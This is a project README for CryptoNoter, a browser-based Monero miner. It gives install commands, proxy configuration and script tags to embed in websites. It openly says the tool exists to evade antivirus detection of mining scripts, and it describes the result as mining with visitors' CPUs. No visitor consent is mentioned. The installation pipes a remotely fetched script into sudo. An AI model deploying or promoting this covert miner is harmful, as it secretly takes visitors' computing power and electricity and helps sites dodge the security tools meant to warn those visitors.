# I AM NOT AUTHOR OF THIS PROJECT, I OPTIMIZED IT AND SWITCHED IT FOR MODERN TECHNOLOGIES

## IMPORTANT NOTE
I (JayWalker512, aka Brandon Foltz) am NOT the author of this software. I forked this repository from it's original author (cryptonoter) to serve as a mirror in case they disappeared and deleted their repository (which they did). 

I cannot provide any assistance, support, bug fixes, etc. for this software. You are 100% on your own and using this software at your own risk.

## CryptoNoter In-Browser Javascript XMR miner
`Open Source Project` `"Plug & Play" Installation` `Set Up Within 10 Mins`<br /><br />
In-Browser Javascript XMR miner for websites / Payout towards personal XMR wallet<br />
Built for in-browser javascript mining on any Monero pools. 0% Commission. 100% Payout
* You can set up CryptoNoter wthin 10 minutes if you have basic knowledge of server set-up. If you are a newbie, you might need to take some time to set up CryptoNoter

## Why This Open Source Project Is Created
* Websites that use Javscript browser miners (Coinhive, Crypto-Loot, etc) are specifically targeted by most anti-virus softwares including the built-in Windows Defender. When visitors visit these websites, they will be notified that malicious codes / viruses have been detected on these websites. Well, you should know how such notifications affect the website. In addition, you get charged up to 30% commission by these javscript mining platforms.

This open source project is created to bypass detection and avoid being flagged as malicious websites by running your own Javscript Mining Server and deploying it on your websites. It is similar to Coinhive idea, however you do not have to be charged for any percent of your earnings. You can point to any Monero mining pool and get 100% for your mining efforts. (Of course, less the pool fees)

## Requirements
The project is basically a "Plug & Play" installation. Most of the configurations are setup automatically when you run the installation. Simply follow the step by step installation. 

However, if you decide to modify or optimize CryptoNoter for maximum mining capabilities, you will need good knowledge on Nginx Reverse Proxy, javascript, etc. For example, we did approx 1550 H/s for a website with approx 15,000 visitors (Avg Time on Page: 55 secs / visitor) before optimization. After optimization, we are doing on avg 3500 H/s

`Minimum System Requirements`
1. Server with at least 1 CPU, 1 GB Ram & 8GB Harddisk [You will need better specs if you have higher traffic load]
2. Ubuntu(Debian) OS
3. Nginx, Nodejs, NPM & Forever Packages
4. SSL Support For Domain. Use https://certbot.eff.org/

`IMPORTANT NOTE:` DO NOT USE GOOGLE COMPUTE ENGINE (GCE) or other related Google CLoud Services for crypto-mining services. It is in violation of their TOS. Google will suspend your account, lock your files and charge you for the usage. Been there, done that. So don't waste your precious time.

## Installation
Install CryptoNoter
```bash
curl https://raw.githubusercontent.com/cryptonoter/CryptoNoter/master/install.sh > install.sh
sudo sh install.sh
```

During the installation process, you are REQUIRED to specify your Monero Wallet Address. If you do not specify your wallet address, the installer will prompt you for it before proceeding with installation.

* Install Control Panel (Vesta CP or Cpanel)
* Set Up Your Domain DNS Properly & Configure Firewalls
* Use CertBot To Assign SSL For Your Domain
* Login Via FTP and Upload The Files Within The `web` Folder To Your Domain

## Important
This is a Nginx Reverse Proxy server setup, YOU NEED TO ADD THE FOLLOWING TO YOUR NGINX.CONF file under the domain. Without the following configuration, it will not work.

```html
   location /proxy {  
  	add_header 'Access-Control-Allow-Origin' * always;
  	proxy_pass http://localhost:7777;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
      }
```

## Usage
* Run CryptoNoter server.js script
```bash
forever start /srv/CryptoNoter/server.js
```
* Make sure CryptoNoter server.js script is running on the server by using the command `forever list`
```bash
info:    Forever processes running
data:        uid  command       script                     forever pid  id logfile                 uptime
data:    [0] tX4L /usr/bin/node /srv/CryptoNoter/server.js 7379    7385    /root/.forever/tX4L.log 0:0:59:11.96
```
* Make sure you have uploaded the `web` folder to your domain public_html or domain root. Ensure you can access https://YOUR_DOMAIN_NAME/demo.html

* Change the settings for these files: worker.js, processor.js & lib/cryptonight-asmjs.min.js<br />
Replace %CryptoNoter_domain% with your DOMAIN_NAME

```html
self.CryptoNoter = self.CryptoNoter || {};
self.CryptoNoter.CONFIG = {
    LIB_URL: "https://%CryptoNoter_domain%/lib/",
    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
};
```

* Add the following javascript before the `</head>` tag onto webpages that you want the miner to run on. Remember to replace www.cryptonoter.com with your domain name. Else, you will be mining for my wallet
```html
<script src="https://www.cryptonoter.com/processor.js"></script>
<script>
    var miner = new CryptoNoter.Anonymous('CryptoNoter').start();
</script>
```
* Done! You can now start mining using your visitors' CPU resources by adding the above tag to any of your websites.
Have a look at CryptoNoter Demo: https://www.cryptonoter.com/demo.php

## JS Miner Documentation
There are parameters that you can preset within the javscript miner script.

*`autothreads(value)`
The number of threads the miner should start with. Set to true is to auto detect the number of CPU cores available on the user's computer.

*`throttle(value)`
Set the fraction of time that threads should be idle. A value of 0 means no throttling (i.e. full speed), a value of 0.5 means that threads will stay idle 50% of the time, with 0.8 they will stay idle 80% of the time.

Here are some basic configuration for the parameters:
```html
<script src="https://www.cryptonoter.com/processor.js"></script>
<script>
	var addr = 'CryptoNoter';
	var miner = new CryptoNoter.Anonymous(addr, {
        autoThreads: true,
	throttle: 0.8
	});
	miner.start();
</script>
```

## Troubleshooting
Check if server.js execute successfully by using this command
```bash
node /srv/CryptoNoter/server.js
```
If script executes successfully, it should show:
```bash
In-Browser Javascript XMR miner for websites / Payout towards personal XMR wallet
Built for in-browser javascript mining on any Monero pools. 0% Commission. 100% Payout

 Listen on : 127.0.0.1:7777
 Pool Host : monero.us.to:1111
 Ur Wallet : YOUR_WALLET_ADDRESS
```
If script executes unsucessfully, it should show error logs. Troubleshoot by referring to the errors shown.
`For example:` The error log shown below means that the port 7777 is currently in use. `To resolve:` Simply listen to the port 7777, identify the process that is using the port and kill the process. Then try executing the script server.js again
```bash
Error: listen EADDRINUSE 127.0.0.1:7777
    at Object._errnoException (util.js:1024:11)
    at _exceptionWithHostPort (util.js:1046:20)
    at Server.setupListenHandle [as _listen2] (net.js:1351:14)
    at listenInCluster (net.js:1392:12)
    at doListen (net.js:1501:7)
    at _combinedTickCallback (internal/process/next_tick.js:141:11)
    at process._tickCallback (internal/process/next_tick.js:180:9)
    at Function.Module.runMain (module.js:678:11)
    at startup (bootstrap_node.js:187:16)
    at bootstrap_node.js:608:3
```
`Common Issues & Bugs:`
1. Port in use. Check if the port is listening?
2. Connection errors are commonly casused by iptables. Check your firewall settings
3. CryptoNoter not generating hashes. Check your config.json setting
4. Check the setting of nginx.conf, config.json, worker.js, processor.js & cryptonight-asmjs.min.js

## Future Developments
At this moment, I'm working on the coding to make it compatible with majority of the CryptoNote currencies. In addition, i am also working to build a pool that supports in-browser javascript mining.

## Mining Pools
I am not affilated to the xmr mining pool: monero.us.to:1111
This pool is referenced in the coding because i am personally using it for my web mining network. It is not the best ideal pool and you may change it to whichever pool you prefer.

I am planning to create and host a custom pool that supports difficulty level < 500 so that miners can submit their shares more often within 60 seconds interval. 

In a low difficulty pool, miners submit shares more often and hence results in higher bandwidth costs. It will be difficult for me to maintain a low difficulty pool all by myself, however it will be possible if everyone can understand the mission of the project: Great things happen when we work together. The power of collaboration.

Please consider a donation for my future developments. Thank you

## XMR Donations To Support
I am looking to add other cryptonote currencies support onto this platform and also to create a monero pool specifically for javascript browser mining. There are costs involved in developments. If you are interested in my future developments, i would really appreciate a small donation to support this project.
